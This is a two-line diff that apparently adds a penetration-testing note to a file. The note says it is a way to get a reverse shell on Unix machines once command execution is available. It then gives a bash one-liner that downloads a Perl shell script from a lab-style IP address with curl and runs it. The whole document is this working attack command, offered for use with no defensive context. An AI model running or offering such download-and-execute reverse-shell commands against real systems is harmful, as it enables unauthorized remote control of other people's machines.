@@ -1,0 +1,2 @@
+For unix machines a way to get reverse shell if have shell command execute:
+/bin/bash -c "perl <(curl http://10.11.0.x/temp/perlshell.pl)"
